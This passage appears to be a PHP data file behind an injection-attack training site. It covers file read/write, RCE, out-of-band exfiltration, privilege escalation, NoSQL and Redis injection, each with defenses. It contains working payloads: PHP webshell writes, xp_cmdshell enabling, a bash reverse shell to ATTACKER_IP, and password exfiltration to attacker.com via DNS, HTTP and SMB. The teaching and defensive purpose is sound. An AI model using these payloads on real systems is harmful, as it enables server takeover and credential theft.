            'Assuming the WAF blocks everything: most WAFs have specific rules, not universal coverage',
            'Not identifying which specific words/chars are blocked before attempting bypasses',
            'Using overly complex payloads when a simple case variation would work',
            'Wide byte only works with addslashes + multi-byte charset: it does not bypass mysql_real_escape_string with correct charset',
            'Double keyword bypass only works against single-pass filters, not recursive ones',
        ],

        'real_world' => 'WAF bypasses are a critical skill in penetration testing. Major CDN/WAF providers (Cloudflare, AWS WAF, ModSecurity, Akamai) are regularly bypassed using novel techniques. The GBK wide byte injection was discovered in the mid-2000s and led to the recommendation to always use <code>SET NAMES utf8mb4</code> and <code>mysql_set_charset()</code> instead of <code>addslashes()</code>. WAF bypass is a cat-and-mouse game. WAFs add rules, researchers find new bypasses.',

        'defense' => '<strong>WAFs are defense-in-depth, not primary protection.</strong> They can be bypassed and should never be relied upon as the sole defense. Use <strong>parameterized queries</strong> as the primary fix. If using WAF: keep rules updated, use whitelisting over blacklisting, and set the correct charset on the database connection (UTF-8, not GBK).',
    ],

    'file-operations' => [
        'name'       => 'File Read / Write',
        'icon'       => 'F',
        'categories' => ['File Operations'],
        'severity'   => 'critical',
        'prereqs'    => 'Stacked queries or UNION injection. Knowledge of the target OS file paths and web root location.',

        'summary' => 'File operation attacks use database built-in functions to read arbitrary files from the server (source code, config files, /etc/passwd) or write files to disk (PHP webshells, SSH keys, cron jobs). This bridges the gap between SQL injection and full server compromise.',

        'how' => '<p>Most database engines include file I/O capabilities for import/export. If the database user has the required privileges, an attacker with SQL injection can:</p>
<ul>
<li><strong>Read files:</strong> Extract the contents of any file the database process can read. This includes application source code (revealing more vulnerabilities), configuration files (database credentials, API keys), and system files (<code>/etc/passwd</code>, <code>/etc/shadow</code> if readable).</li>
<li><strong>Write files:</strong> Create arbitrary files on the server. The most common target is the <strong>web root</strong> to write a PHP/ASPX webshell, providing Remote Code Execution. Other targets include SSH authorized_keys and cron jobs.</li>
</ul>
<p>File operations require specific privileges: MySQL needs the <code>FILE</code> privilege, PostgreSQL needs <code>pg_read_server_files</code>/<code>pg_write_server_files</code> roles (or superuser), and MSSQL needs <code>BULK ADMIN</code> or <code>sysadmin</code> role.</p>',

        'indicators' => [
            'The database user has FILE privilege or superuser/sysadmin role',
            'Stacked queries are supported (needed for COPY, CONFIG SET)',
            'The web root path is known or discoverable (via error messages or common locations)',
            'The database process has write access to the web root directory',
        ],

        'steps' => [
            '<strong>Check privileges</strong>: Query the database to see the current user\'s privileges.',
            '<strong>Identify the web root</strong>: From error messages, or try common paths: <code>/var/www/html/</code>, <code>C:\\inetpub\\wwwroot\\</code>.',
            '<strong>Read sensitive files</strong>: Extract <code>/etc/passwd</code>, application config files, or source code.',
            '<strong>Write a webshell</strong>: Write <code>&lt;?php system($_GET["cmd"]); ?&gt;</code> to the web root.',
            '<strong>Access the webshell</strong>: Browse to the written file to execute OS commands.',
        ],

        'payloads' => [
            ['label' => 'MySQL: read file', 'code' => "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -"],
            ['label' => 'MySQL: write webshell', 'code' => "' UNION SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -"],
            ['label' => 'PostgreSQL: read file', 'code' => "'; SELECT pg_read_file('/etc/passwd')--"],
            ['label' => 'PostgreSQL: COPY read', 'code' => "'; CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp--"],
            ['label' => 'PostgreSQL: write file', 'code' => "'; COPY (SELECT '<?php system(\$_GET[\"c\"]); ?>') TO '/var/www/html/shell.php'--"],
            ['label' => 'MSSQL: read file', 'code' => "'; SELECT * FROM OPENROWSET(BULK 'C:\\windows\\win.ini', SINGLE_CLOB) AS x--"],
            ['label' => 'Redis: write file', 'code' => "CONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload '<?php system(\$_GET[\"c\"]); ?>'\r\nSAVE"],
            ['label' => 'SQLite: ATTACH write', 'code' => "'; ATTACH DATABASE '/var/www/html/shell.php' AS db; CREATE TABLE db.x(y text); INSERT INTO db.x VALUES('<?php system(\$_GET[\"c\"]); ?>')-- -"],
        ],

        'techniques' => [
            'MySQL'      => '<strong>Read:</strong> <code>LOAD_FILE(\'/path/to/file\')</code>: requires FILE privilege. <strong>Write:</strong> <code>INTO OUTFILE \'/path\'</code> or <code>INTO DUMPFILE \'/path\'</code> (for binary). Requires FILE privilege and <code>secure_file_priv</code> must allow the target directory.',
            'PostgreSQL' => '<strong>Read:</strong> <code>pg_read_file()</code> (superuser), <code>COPY table FROM \'/path\'</code>. <strong>Write:</strong> <code>COPY (SELECT data) TO \'/path\'</code>, <code>lo_export(oid, \'/path\')</code>. Requires superuser or <code>pg_write_server_files</code> role.',
            'MSSQL'      => '<strong>Read:</strong> <code>OPENROWSET(BULK \'/path\', SINGLE_CLOB)</code>, <code>xp_cmdshell \'type file\'</code>. <strong>Write:</strong> <code>xp_cmdshell \'echo data > /path\'</code>. Requires BULK ADMIN or sysadmin role.',
            'SQLite'     => '<strong>Write:</strong> <code>ATTACH DATABASE \'/path/file\' AS db</code> then CREATE TABLE and INSERT. No native file read capability (read via load_extension only).',
            'Redis'      => '<strong>Write:</strong> <code>CONFIG SET dir /path; CONFIG SET dbfilename file; SAVE</code>: writes the entire Redis dump to the target file. Extremely powerful for writing webshells, SSH keys, or cron jobs.',
        ],

        'mistakes' => [
            'MySQL: secure_file_priv restricts LOAD_FILE and INTO OUTFILE to a specific directory (or disables them entirely in modern installations)',
            'Not knowing the web root path: files written to the wrong directory are useless',
            'PostgreSQL: forgetting that COPY requires superuser role for arbitrary file paths',
            'Writing binary webshells with INTO OUTFILE (it adds line terminators): use INTO DUMPFILE for binary content',
        ],

        'real_world' => 'File write via SQL injection was used in the 2014 JPMorgan Chase breach (83 million accounts). Redis CONFIG SET for webshell deployment is a common post-exploitation technique in cloud environments. The combination of SQL injection + file write + webshell remains one of the most practical server compromise chains.',

        'defense' => '<strong>Least privilege:</strong> Never grant FILE privilege to web application database users. Revoke <code>pg_read_server_files</code> and <code>pg_write_server_files</code> roles. Set MySQL <code>secure_file_priv</code> to empty or a specific safe directory. For Redis: rename dangerous commands (CONFIG, SAVE, MODULE). Restrict file system permissions so the database process cannot write to the web root.',
    ],

    'code-execution' => [
        'name'       => 'Remote Code Execution (RCE)',
        'icon'       => 'X',
        'categories' => ['Code Execution'],
        'severity'   => 'critical',
        'prereqs'    => 'Stacked queries, elevated database privileges, or file write access. Understanding of OS command execution and reverse shells.',

        'summary' => 'Remote Code Execution through SQL injection is the ultimate impact: executing operating system commands on the database server. This enables complete server takeover: data exfiltration, lateral movement, persistence, and full compromise of the host.',

        'how' => '<p>RCE through SQL injection uses database-specific features designed for system administration. These features were built for legitimate DBA use but become weapons when accessible through SQL injection:</p>
<ul>
<li><strong>MSSQL xp_cmdshell:</strong> Directly executes OS commands and returns output. The most straightforward path from SQLi to RCE. Disabled by default but can be re-enabled with sysadmin privileges via <code>sp_configure</code>.</li>
<li><strong>PostgreSQL COPY TO PROGRAM:</strong> Pipes query output to an OS command. <code>COPY (SELECT \'\') TO PROGRAM \'id\'</code> executes <code>id</code> on the server.</li>
<li><strong>UDF (User-Defined Functions):</strong> Upload a malicious shared library (.so/.dll) then CREATE FUNCTION to call it. Works in MySQL, PostgreSQL, and SQLite (via load_extension).</li>
<li><strong>Oracle Java stored procedures:</strong> Oracle supports Java in the database. Create a Java class with <code>Runtime.getRuntime().exec()</code> for RCE.</li>
<li><strong>External scripts:</strong> MSSQL supports <code>sp_execute_external_script</code> for Python/R execution.</li>
</ul>
<p>In all cases, the key requirement is <strong>sufficient privileges</strong>. Most RCE vectors require DBA/superuser/sysadmin role. If the current user doesn\'t have these, privilege escalation (see that topic) may be needed first.</p>',

        'indicators' => [
            'Stacked queries are supported',
            'The database user has sysadmin/superuser/DBA privileges',
            'MSSQL: xp_cmdshell is enabled or can be re-enabled',
            'PostgreSQL: COPY TO PROGRAM is available (superuser)',
            'File write access exists (for UDF upload)',
        ],

        'steps' => [
            '<strong>Confirm stacked queries</strong>: Required for most RCE vectors.',
            '<strong>Check current privileges</strong>: Are you sysadmin (MSSQL), superuser (PgSQL), or root (MySQL)?',
            '<strong>Enable the RCE feature if needed</strong>: MSSQL: <code>EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE</code>.',
            '<strong>Execute a test command</strong>: <code>EXEC xp_cmdshell \'whoami\'</code> or <code>COPY (SELECT \'\') TO PROGRAM \'id\'</code>.',
            '<strong>Establish persistence</strong>: Create a reverse shell, add SSH keys, or write a webshell for stable access.',
        ],

        'payloads' => [
            ['label' => 'MSSQL: enable xp_cmdshell', 'code' => "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--"],
            ['label' => 'MSSQL: execute command', 'code' => "'; EXEC xp_cmdshell 'whoami'--"],
            ['label' => 'MSSQL: reverse shell', 'code' => "'; EXEC xp_cmdshell 'powershell -e <base64_payload>'--"],
            ['label' => 'PostgreSQL: COPY TO PROGRAM', 'code' => "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'--"],
            ['label' => 'PostgreSQL: reverse shell', 'code' => "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'--"],
            ['label' => 'MySQL: UDF (after upload)', 'code' => "'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('id')-- -"],
            ['label' => 'Oracle: Java RCE', 'code' => "'; CREATE OR REPLACE JAVA SOURCE AS public class Cmd { public static String run(String c) throws Exception { ... } }; --"],
            ['label' => 'MSSQL: Python script', 'code' => "'; EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system(\"whoami\")'--"],
        ],

        'techniques' => [
            'MSSQL'      => '<code>xp_cmdshell</code>: direct OS command execution with output. <code>sp_OACreate</code>: COM object instantiation for file operations. <code>sp_execute_external_script</code>: Python/R code execution. All require sysadmin or specific server-level privileges.',
            'PostgreSQL' => '<code>COPY (SELECT) TO PROGRAM \'cmd\'</code>: pipes data to a command. <code>CREATE FUNCTION ... LANGUAGE C</code>: load a .so as UDF. Both require superuser. <code>lo_import</code> + <code>lo_export</code> chain can upload the .so file.',
            'MySQL'      => 'UDF via <code>lib_mysqludf_sys</code>: upload .so to plugin directory, <code>CREATE FUNCTION sys_exec</code>. Requires FILE privilege and plugin_dir write access. <code>INTO DUMPFILE</code> to write the .so file.',
            'Oracle'     => 'Java stored procedures with <code>Runtime.getRuntime().exec()</code>. <code>DBMS_SCHEDULER</code> with <code>job_type => \'EXECUTABLE\'</code> for OS jobs. Both require CREATE PROCEDURE and specific Java permissions.',
            'SQLite'     => '<code>load_extension(\'/path/to/malicious.so\')</code>: loads a shared library. The .so must export <code>sqlite3_extension_init()</code>. Rarely available (disabled by default in most deployments).',
            'Redis'      => '<code>MODULE LOAD /path/to/malicious.so</code>: loads a Redis module with arbitrary code. <code>EVAL</code> with Lua scripts can also execute limited operations.',
        ],

        'mistakes' => [
            'MSSQL: forgetting to enable xp_cmdshell first (disabled by default since SQL Server 2005)',
            'PostgreSQL: COPY TO PROGRAM does not return command output directly: redirect to a file then read it',
            'MySQL UDF: uploading to wrong directory: must be the plugin_dir (SELECT @@plugin_dir)',
            'Not considering the database process user. RCE runs as the DB service account, which may have limited OS permissions',
            'Reverse shells: forgetting that the DB server may have egress filtering: test with DNS or ICMP first',
        ],

        'real_world' => 'SQL injection to RCE is the standard escalation path in penetration tests. MSSQL xp_cmdshell is one of the most frequently exploited features in Windows-centric environments. PostgreSQL COPY TO PROGRAM was added in version 9.3 and immediately became a go-to for attackers. The MSSQL attack chain (SQLi -> sysadmin check -> enable xp_cmdshell -> RCE) is a standard module in Metasploit and sqlmap (--os-shell).',

        'defense' => '<strong>Disable dangerous features:</strong> MSSQL: keep xp_cmdshell disabled, restrict sp_configure. PostgreSQL: don\'t grant superuser to application accounts. MySQL: restrict FILE privilege and plugin_dir write access. SQLite: compile with <code>SQLITE_OMIT_LOAD_EXTENSION</code>. Redis: rename MODULE, CONFIG, SLAVEOF commands. <strong>Network segmentation:</strong> Database servers should not have internet access. <strong>Least privilege:</strong> The DB user should have only SELECT/INSERT/UPDATE/DELETE on specific tables.',
    ],

    'out-of-band' => [
        'name'       => 'Out-of-Band (OOB) Exfiltration',
        'icon'       => 'O',
        'categories' => ['Out-of-Band'],
        'severity'   => 'high',
        'prereqs'    => 'Understanding of DNS, HTTP, and SMB protocols. Access to an external listener (Burp Collaborator, interactsh, webhook.site, or custom DNS server).',

        'summary' => 'Out-of-Band exfiltration sends data through an external channel (DNS lookup, HTTP request, SMB connection) when no in-band response, error, or timing signal is available. The database server makes an outbound connection to an attacker-controlled server, embedding extracted data in the request.',

        'how' => '<p>OOB exfiltration is used when all other channels are blocked:</p>
<ul>
<li>No query output displayed (rules out UNION)</li>
<li>No error messages (rules out error-based)</li>
<li>No boolean or timing oracle (rules out blind)</li>
<li>But the database server <strong>can make outbound connections</strong></li>
</ul>
<p>The attacker sets up an external listener, then injects SQL that forces the database to make an outbound request containing the extracted data. The three most common channels are:</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">DNS Exfiltration</h5>
<p>The most reliable channel because DNS traffic is almost never blocked by firewalls. The attacker embeds data in a DNS subdomain: <code>SELECT ... INTO \'\\\\DATA.attacker.com\\share\'</code>. The DNS query for <code>DATA.attacker.com</code> is logged on the attacker\'s DNS server, revealing the extracted data.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">HTTP Exfiltration</h5>
<p>The database makes an HTTP request to the attacker\'s server with data in the URL or body. Functions like <code>UTL_HTTP.REQUEST()</code> (Oracle), <code>xp_cmdshell \'curl\'</code> (MSSQL), or <code>dblink_connect()</code> (PostgreSQL) enable this.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">SMB/UNC Exfiltration (Windows)</h5>
<p>On Windows, UNC paths (<code>\\\\server\\share</code>) trigger SMB connections. MSSQL\'s <code>xp_dirtree</code> or <code>LOAD_FILE()</code> with a UNC path sends the NTLM hash or data to the attacker\'s SMB listener.</p>',

        'indicators' => [
            'No visible output, no errors, no boolean/timing oracle (all other techniques fail)',
            'The database server has outbound network access (not air-gapped)',
            'Database functions for network operations are available (UTL_HTTP, xp_dirtree, dblink)',
        ],

        'steps' => [
            '<strong>Set up a listener</strong>: Use Burp Collaborator, interactsh (<code>xxxxx.oast.fun</code>), webhook.site, or your own DNS server.',
            '<strong>Choose the OOB channel</strong>: DNS is most reliable (rarely blocked). HTTP is faster but may be filtered. SMB only works on Windows.',
            '<strong>Inject the OOB trigger</strong>: SQL that makes the database connect to your listener with data embedded.',
            '<strong>Check your listener</strong>: Read the exfiltrated data from DNS queries, HTTP requests, or SMB connections.',
            '<strong>Iterate</strong>: Extract more data by repeating with different subqueries.',
        ],

        'payloads' => [
            ['label' => 'MSSQL: DNS via xp_dirtree', 'code' => "'; DECLARE @d VARCHAR(99); SELECT @d=(SELECT TOP 1 password FROM users); EXEC xp_dirtree '\\\\'+@d+'.attacker.com\\x'--"],
            ['label' => 'MSSQL: SMB hash capture', 'code' => "'; EXEC xp_dirtree '\\\\attacker.com\\share'--"],
            ['label' => 'Oracle: HTTP via UTL_HTTP', 'code' => "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM<=1))--"],
            ['label' => 'Oracle: DNS via UTL_INADDR', 'code' => "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM<=1)||'.attacker.com')--"],
            ['label' => 'PostgreSQL: DNS via dblink', 'code' => "'; SELECT dblink_connect('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com dbname=x')--"],
            ['label' => 'MySQL: DNS (Windows)', 'code' => "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\x'))-- -"],
        ],

        'techniques' => [
            'MSSQL'      => '<code>xp_dirtree \'\\\\data.attacker.com\\x\'</code>: triggers DNS + SMB. <code>fn_xe_file_target_read_file()</code>: UNC path read. <code>OPENROWSET</code> with remote server. Most flexible OOB options.',
            'Oracle'     => '<code>UTL_HTTP.REQUEST(url)</code>: HTTP GET request. <code>HTTPURITYPE(url).getclob()</code>: another HTTP method. <code>UTL_INADDR.GET_HOST_ADDRESS(hostname)</code>: DNS lookup. <code>DBMS_LDAP.INIT(host,port)</code>: LDAP connection.',
            'PostgreSQL' => '<code>dblink_connect(\'host=x.attacker.com\')</code>: DNS lookup during connection attempt. <code>COPY TO PROGRAM \'curl http://attacker.com/?d=data\'</code>: HTTP via command execution (requires superuser).',
            'MySQL'      => '<code>LOAD_FILE(\'\\\\\\\\data.attacker.com\\\\share\')</code>: UNC path DNS lookup (Windows only). <code>INTO OUTFILE \'\\\\\\\\attacker.com\\\\share\'</code>: SMB write. Very limited on Linux MySQL.',
            'Redis'      => '<code>SLAVEOF attacker.com 6379</code>: initiates replication to attacker\'s Redis server, exfiltrating all data.',
        ],

        'mistakes' => [
            'Forgetting that DNS hostnames have a 63-character subdomain limit and 253-character total limit: extract data in chunks',
            'DNS data must be valid hostname characters (alphanumeric + hyphen): hex-encode binary data',
            'MySQL LOAD_FILE UNC paths only work on Windows (Linux MySQL ignores UNC paths)',
            'Not accounting for firewall egress rules: some environments block all outbound except DNS',
            'Using HTTP when HTTPS is required by the egress firewall',
        ],

        'real_world' => 'OOB exfiltration via DNS is one of the most powerful post-exploitation techniques because DNS is rarely monitored or blocked. Burp Collaborator and interactsh have made OOB testing accessible to all pentesters. The technique was used in the 2020 SolarWinds attack (albeit not through SQLi) to exfiltrate data via DNS. MSSQL xp_dirtree is the most commonly used OOB vector in Windows-centric environments.',

        'defense' => '<strong>Restrict outbound network from database servers.</strong> Firewall egress rules should block all unnecessary outbound connections. DNS: use an internal DNS resolver that blocks external lookups from the DB server. Disable <code>UTL_HTTP</code>, <code>xp_dirtree</code>, <code>dblink</code> if not needed. Monitor DNS query logs for unusual subdomain patterns.',
    ],

    'privilege-escalation' => [
        'name'       => 'Privilege Escalation',
        'icon'       => 'P',
        'categories' => ['Privilege Escalation'],
        'severity'   => 'critical',
        'prereqs'    => 'Stacked queries (usually required). Understanding of database role/privilege systems.',

        'summary' => 'Privilege escalation exploits misconfigured database permissions to elevate from a low-privilege application user to DBA or superuser. Once elevated, the attacker unlocks file I/O, RCE, and full database control that was previously inaccessible.',

        'how' => '<p>Web applications typically connect to the database with a limited user account that can only SELECT, INSERT, UPDATE, and DELETE on specific tables. This limits the impact of SQL injection: the attacker can read and modify application data but cannot access system tables, read files, or execute OS commands.</p>
<p>Privilege escalation changes this by elevating the current session\'s privileges. Methods include:</p>
<ul>
<li><strong>MSSQL EXECUTE AS:</strong> If the low-privilege user has impersonation rights, they can <code>EXECUTE AS LOGIN = \'sa\'</code> to temporarily become the sysadmin.</li>
<li><strong>MSSQL Linked Servers:</strong> A linked server configured with sysadmin credentials allows <code>OPENQUERY(linked_server, \'EXEC xp_cmdshell ...\')</code>.</li>
<li><strong>PostgreSQL ALTER ROLE:</strong> If the user has CREATEROLE privilege, they can <code>ALTER ROLE current_user SUPERUSER</code>.</li>
<li><strong>Oracle AUTHID DEFINER:</strong> Stored procedures running with DEFINER privileges execute with the creator\'s (often DBA) permissions, not the caller\'s.</li>
<li><strong>MySQL GRANT:</strong> If the user has GRANT privilege, they can grant themselves additional privileges.</li>
</ul>',

        'indicators' => [
            'Stacked queries are supported (needed for EXECUTE AS, ALTER ROLE, etc.)',
            'The current user has impersonation rights (MSSQL) or CREATEROLE (PostgreSQL)',
            'Linked servers exist with higher-privilege credentials',
            'Stored procedures with DEFINER/SECURITY DEFINER exist',
        ],

        'steps' => [
            '<strong>Enumerate current privileges</strong>: Query system tables to see what the current user can do.',
            '<strong>Check impersonation rights</strong>: MSSQL: <code>SELECT * FROM sys.server_permissions WHERE type=\'IM\'</code>.',
            '<strong>Check linked servers</strong>: MSSQL: <code>EXEC sp_linkedservers</code>.',
            '<strong>Attempt escalation</strong>: <code>EXECUTE AS LOGIN = \'sa\'</code> (MSSQL), <code>ALTER ROLE current_user SUPERUSER</code> (PgSQL).',
            '<strong>Verify new privileges</strong>: After escalation, confirm elevated access by reading system tables or executing privileged operations.',
        ],

        'payloads' => [
            ['label' => 'MSSQL: check permissions', 'code' => "'; SELECT * FROM fn_my_permissions(NULL, 'SERVER')--"],
            ['label' => 'MSSQL: impersonate sa', 'code' => "'; EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'--"],
            ['label' => 'MSSQL: linked server', 'code' => "'; SELECT * FROM OPENQUERY(linked_srv, 'SELECT * FROM master..syslogins')--"],
            ['label' => 'PostgreSQL: check role', 'code' => "'; SELECT current_user, rolsuper FROM pg_roles WHERE rolname=current_user--"],
            ['label' => 'PostgreSQL: escalate', 'code' => "'; ALTER ROLE current_user SUPERUSER--"],
            ['label' => 'Oracle: check DBA', 'code' => "' UNION SELECT granted_role,NULL,NULL FROM user_role_privs--"],
            ['label' => 'Oracle: GRANT DBA', 'code' => "'; EXECUTE IMMEDIATE 'GRANT DBA TO ' || USER--"],
        ],

        'techniques' => [
            'MSSQL'      => '<code>EXECUTE AS LOGIN/USER</code>: impersonate higher-privilege accounts if IMPERSONATE permission is granted. <code>Linked servers</code>: pivot through linked servers configured with sysadmin credentials. <code>TRUSTWORTHY database</code>: if db is TRUSTWORTHY and owned by sa, can escalate via db_owner role.',
            'PostgreSQL' => '<code>ALTER ROLE current_user SUPERUSER</code>: if user has CREATEROLE. <code>ALTER ROLE current_user WITH LOGIN</code>: if role is nologin. <code>SECURITY DEFINER</code> functions: execute with owner privileges.',
            'Oracle'     => '<code>AUTHID DEFINER</code> stored procedures: run with creator\'s (often DBA) privileges. <code>GRANT DBA TO user</code>: via stacked queries if CREATE ROLE privilege exists. <code>DBMS_METADATA</code>: can expose DBA credentials.',
        ],

        'mistakes' => [
            'MSSQL: trying EXECUTE AS without checking if impersonation permission exists',
            'PostgreSQL: ALTER ROLE SUPERUSER requires CREATEROLE privilege (not just CREATE)',
            'Not reverting privileges after testing. EXECUTE AS stays in effect until REVERT',
            'Assuming privilege escalation is always possible: well-configured databases prevent it entirely',
        ],

        'real_world' => 'Privilege escalation is a standard step in database penetration testing. MSSQL impersonation misconfiguration is extremely common in enterprise environments (often caused by legacy configurations or third-party applications that require impersonation rights). The TRUSTWORTHY database attack vector in MSSQL has been used in numerous real-world compromises. HackTheBox and similar platforms frequently feature SQL injection -> privilege escalation -> RCE chains.',

        'defense' => '<strong>Principle of least privilege:</strong> Application users should only have SELECT/INSERT/UPDATE/DELETE on specific tables. Never grant IMPERSONATE, CREATEROLE, FILE, or superuser. Audit linked server configurations. Set TRUSTWORTHY OFF on all databases. Review stored procedure security contexts (use INVOKER not DEFINER where possible).',
    ],

    'nosql-injection' => [
        'name'       => 'NoSQL Injection',
        'icon'       => 'N',
        'categories' => ['NoSQL Injection'],
        'severity'   => 'high',
        'prereqs'    => 'Understanding of JSON/BSON data structures and MongoDB query operators. Basic knowledge of JavaScript (for $where injection).',

        'summary' => 'NoSQL injection targets document-oriented databases like MongoDB by injecting query operators into parameters. Unlike SQL injection which manipulates string-based queries, NoSQL injection exploits the structured nature of JSON/BSON queries to alter query logic, bypass authentication, and extract data.',

        'how' => '<p>MongoDB queries are JSON objects: <code>db.users.find({username: input, password: input})</code>. If the application parses user input into JSON objects (common in Node.js/Express applications that use <code>req.body</code> directly), an attacker can inject <strong>query operators</strong> instead of string values.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Operator Injection</h5>
<p>Instead of <code>username=admin&amp;password=secret</code>, the attacker sends <code>username=admin&amp;password[$ne]=x</code>. The query becomes <code>{username: "admin", password: {$ne: "x"}}</code>: which matches any document where the password is NOT "x". This bypasses authentication completely.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">$regex Blind Extraction</h5>
<p>The <code>$regex</code> operator enables character-by-character extraction: <code>password[$regex]=^a</code> tests if the password starts with "a". By iterating through characters, the entire value can be extracted: similar to blind SQL injection but using regex instead of SUBSTRING.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">$where JavaScript Injection</h5>
<p>The <code>$where</code> operator evaluates JavaScript server-side: <code>{$where: "this.password == \'secret\'"}</code>. If user input reaches a $where clause, full JavaScript injection is possible, potentially leading to data extraction or denial of service.</p>',

        'indicators' => [
            'The application uses MongoDB, CouchDB, or another document-oriented database',
            'API accepts JSON input or nested parameters (e.g., Express.js parsing)',
            'Sending <code>param[$ne]=x</code> produces different behavior than <code>param=x</code>',
            'Error messages mention "BSON", "MongoError", or "CastError"',
        ],

        'steps' => [
            '<strong>Identify the backend</strong>: Look for MongoDB indicators in error messages, response headers, or technology stack.',
            '<strong>Test operator injection</strong>: Send <code>password[$ne]=x</code> or <code>password[$gt]=</code> to see if authentication is bypassed.',
            '<strong>Extract data with $regex</strong>: <code>password[$regex]=^a</code>, <code>^b</code>, etc. to find each character.',
            '<strong>Test $where injection</strong>: <code>$where: "sleep(5000)"</code> or <code>$where: "this.password.match(/^admin/)"</code>.',
            '<strong>Explore aggregation pipelines</strong>: If the application uses aggregate(), try injecting $match, $lookup, or $group stages.',
        ],

        'payloads' => [
            ['label' => 'Auth bypass ($ne)', 'code' => 'username=admin&password[$ne]=wrongpassword'],
            ['label' => 'Auth bypass ($gt)', 'code' => 'username=admin&password[$gt]='],
            ['label' => 'Blind extraction ($regex)', 'code' => 'username=admin&password[$regex]=^FLAG'],
            ['label' => 'Blind: next character', 'code' => 'username=admin&password[$regex]=^FLAG{a'],
            ['label' => '$where: test injection', 'code' => 'query[$where]=sleep(3000)'],
            ['label' => '$where: extract data', 'code' => "query[\$where]=this.password.match(/^admin/)"],
            ['label' => 'JSON: auth bypass', 'code' => '{"username": "admin", "password": {"$ne": ""}}'],
            ['label' => 'JSON: $exists', 'code' => '{"username": {"$exists": true}, "password": {"$exists": true}}'],
            ['label' => '$lookup: cross-collection', 'code' => '{"$lookup": {"from": "secrets", "localField": "x", "foreignField": "x", "as": "leaked"}}'],
        ],

        'techniques' => [
            'Auth Bypass'     => '<code>$ne</code> (not equal) and <code>$gt</code> (greater than) create always-true conditions. <code>{password: {$ne: ""}}</code> matches any non-empty password. <code>{password: {$gt: ""}}</code> matches any password greater than empty string.',
            'Blind Extraction'=> '<code>$regex</code> enables character-by-character extraction: <code>{password: {$regex: "^a"}}</code>. Start with <code>^F</code>, then <code>^FL</code>, <code>^FLA</code>, etc. The application\'s response difference (login success/failure) is the oracle.',
            'JS Injection'    => '<code>$where</code> evaluates JavaScript server-side. <code>"this.password.match(/^admin/)"</code> for boolean extraction. <code>"sleep(5000)"</code> for time-based. <code>$where</code> is deprecated but still supported in many deployments.',
            'Pipeline Attacks' => 'Inject stages into aggregation pipelines: <code>$match</code> to filter, <code>$lookup</code> to join other collections (cross-collection access), <code>$group</code> to aggregate, <code>$out</code> to write results to a new collection.',
            'Type Confusion'  => 'Send objects where strings are expected: <code>param[$exists]=true</code> matches any document with that field. <code>param[$type]=2</code> matches string type. Useful when the exact value is unknown.',
        ],

        'mistakes' => [
            'Assuming NoSQL databases are immune to injection: they are not',
            'Only testing simple strings. NoSQL injection requires sending objects/arrays',
            'Forgetting URL encoding for special characters in query operators',
            'Not realizing that Express.js auto-parses nested parameters (param[$ne] becomes {$ne: value})',
            '$where injection: not accounting for JavaScript sandbox limitations in newer MongoDB versions',
        ],

        'real_world' => 'NoSQL injection is increasingly common as MongoDB adoption grows. CVE-2019-2729 (Oracle WebLogic) and multiple npm package vulnerabilities have exposed NoSQL injection in production. Authentication bypass via $ne injection is one of the most common findings in Node.js/Express.js application security assessments. Bug bounty programs frequently reward NoSQL injection findings.',

        'defense' => '<strong>Validate input types strictly</strong>: reject objects/arrays when expecting strings. Use MongoDB sanitize libraries (e.g., <code>express-mongo-sanitize</code>). <strong>Disable $where</strong> in application queries. Use MongoDB\'s built-in schema validation. For Express.js: use <type-checking middleware that rejects nested parameters in expected-string fields.',
    ],

    'command-injection' => [
        'name'       => 'Protocol / Command Injection',
        'icon'       => 'C',
        'categories' => ['Command Injection'],
        'severity'   => 'critical',
        'prereqs'    => 'Understanding of Redis RESP protocol, CRLF (\\r\\n) significance in text protocols, and Lua scripting basics.',

        'summary' => 'Protocol injection targets text-based database protocols (primarily Redis RESP) by injecting control characters (CRLF) that terminate the current command and start new ones. This enables arbitrary command execution on the database server.',

        'how' => '<p>Redis uses a text-based protocol called RESP (Redis Serialization Protocol) where commands are separated by CRLF (<code>\\r\\n</code>). When a web application embeds user input into a Redis command without sanitizing CRLF characters, the attacker can:</p>
<ol>
<li>Terminate the current Redis command with <code>\\r\\n</code></li>
<li>Inject arbitrary Redis commands after the CRLF</li>
<li>The Redis server executes all commands in sequence</li>
</ol>
<p>This is analogous to stacked queries in SQL injection but operates at the <strong>protocol level</strong> rather than the query level.</p>
<p>The impact depends on which Redis commands are available. The most dangerous chain: <code>CONFIG SET dir</code> + <code>CONFIG SET dbfilename</code> + <code>SAVE</code> writes arbitrary files to disk, enabling webshell deployment or SSH key injection.</p>',

        'indicators' => [
            'The application uses Redis as a cache, session store, or data store',
            'User input is embedded in Redis commands (key names, values, or arguments)',
            'Injecting \\r\\n in input causes unexpected behavior',
            'Error messages mention "ERR", "WRONGTYPE", or Redis-specific errors',
        ],

        'steps' => [
            '<strong>Identify Redis usage</strong>: Look for Redis-specific error messages or behavior patterns.',
            '<strong>Test CRLF injection</strong>: Send <code>value\\r\\nPING\\r\\n</code> and look for a PONG response or side effects.',
